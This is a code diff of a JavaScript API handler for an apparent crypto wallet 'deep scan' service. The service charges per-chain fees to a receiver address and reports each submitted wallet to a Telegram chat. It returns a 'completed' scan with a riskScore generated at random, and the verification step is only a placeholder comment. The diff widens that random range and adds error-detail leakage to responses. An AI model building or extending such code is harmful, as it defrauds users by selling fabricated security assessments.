@@ -9,7 +9,7 @@ const RECEIVER_ADDRESS = {
 const REQUIRED_USD = {
   eth: 1.5,
   bsc: 0.5,
-  tron: 0.5,
+  tron: 0,
 };
 
 export default async function handler(req, res) {
@@ -18,7 +18,7 @@ export default async function handler(req, res) {
   }
 
   const { wallet, chain, txHash } = req.body;
-  if (!wallet || !chain) {
+  if (!wallet || !chain || !txHash) {
     return res.status(400).json({ error: 'Missing required parameters' });
   }
 
@@ -28,39 +28,34 @@ export default async function handler(req, res) {
       return res.status(400).json({ error: 'Unsupported chain' });
     }
 
-    // Implement your verification logic here
+    // Here would be your verification logic based on the txHash
     const scanResult = {
       wallet,
       chain: chain.toUpperCase(),
       requiredFee: fee,
       status: 'completed',
-      riskScore: Math.floor(Math.random() * 10),
+      riskScore: Math.floor(Math.random() * 100),
       timestamp: new Date().toISOString()
     };
 
-    // Send Telegram notification
-    try {
-      const botToken = process.env.VITE_TELEGRAM_BOT_TOKEN;
-      const chatId = process.env.VITE_TELEGRAM_CHAT_ID;
-      
-      if (botToken && chatId) {
-        await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({
-            chat_id: chatId,
-            text: `🔍 New Deep Scan\nWallet: ${wallet}\nChain: ${chain.toUpperCase()}\nFee: $${fee}`,
-            parse_mode: 'Markdown'
-          })
-        });
-      }
-    } catch (telegramError) {
-      console.error('Telegram notification failed:', telegramError);
+    // Send Telegram notification if configured
+    const botToken = process.env.VITE_TELEGRAM_BOT_TOKEN;
+    const chatId = process.env.VITE_TELEGRAM_CHAT_ID;
+    if (botToken && chatId) {
+      await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          chat_id: chatId,
+          text: `🔍 New Deep Scan\nWallet: ${wallet}\nChain: ${chain.toUpperCase()}\nFee: $${fee}`,
+          parse_mode: 'Markdown'
+        })
+      });
     }
 
-    return res.status(200).json(scanResult);
+    res.status(200).json(scanResult);
   } catch (error) {
     console.error('Verification error:', error);
-    return res.status(500).json({ error: 'Verification failed' });
+    return res.status(500).json({ error: 'Verification failed', details: error.toString() });
   }
 }
